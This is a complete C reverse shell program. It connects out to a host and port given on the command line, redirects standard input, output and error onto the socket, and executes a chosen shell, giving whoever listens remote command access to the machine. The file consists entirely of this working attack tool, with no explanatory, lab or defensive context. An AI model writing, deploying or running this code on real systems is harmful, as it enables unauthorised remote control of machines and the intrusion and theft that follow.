#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    if (argc != 4) {
        exit(1);
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);
    const char *shell = argv[3];

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        exit(1);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        close(sock);
        exit(1);
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execl(shell, shell, NULL);
    
    close(sock);
    return 0;
}
